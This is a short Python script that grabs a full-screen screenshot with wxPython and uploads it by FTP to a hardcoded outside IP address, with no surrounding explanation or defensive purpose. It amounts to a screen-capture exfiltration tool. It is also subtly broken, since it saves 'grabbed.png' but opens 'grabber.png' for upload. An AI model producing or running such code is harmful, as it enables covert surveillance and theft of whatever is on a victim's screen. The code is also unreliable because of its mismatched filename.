import wx
import os
import ftplib


def grab():
    w = wx. App()
    screen = wx.ScreenDC()
    size = screen.GetSize()
    bmap = wx.Bitmap(size[0],size[1])
    memo = wx.MemoryDC(bmap)
    memo.Blit(0,0,size[0],size[1],screen,0,0)
    user = "USERNAME"
    pwd = "PASSWORD"
    ip_addr = "34.70.134.233"
    del memo
    bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)

    sess_ = ftplib.FTP(ip_addr, user, pwd, '', 120)
    file_ = open("grabber.png", "rb")
    sess_.storbinary("STOR /tmp/grabbed.png", file_)

    file_.close()
    sess_.quit()


if __name__ == '__main__':
    print("Running the program")
    grab()
    print("--FIN--")